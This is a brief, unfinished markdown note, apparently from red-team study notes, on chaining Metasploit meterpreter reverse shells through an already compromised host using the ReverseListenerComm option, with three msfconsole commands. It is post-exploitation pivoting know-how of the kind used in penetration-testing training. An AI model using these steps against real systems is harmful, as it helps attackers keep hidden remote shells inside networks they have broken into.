# P2P Callback Shells

TODO: Fill this info and demonstrate how it works from the reference link below

Make the meterpreter connections act as p2p (peer-to-peer) without the need of SMB pipe meterpreter payloads even if it's not windows at all. ReverseListenerComm will tunnel our meterpreter sessions

```
msf > set ReverseListenerComm <session_id>

msf > set LHOST <compromised_target_IP>

msf > run
```
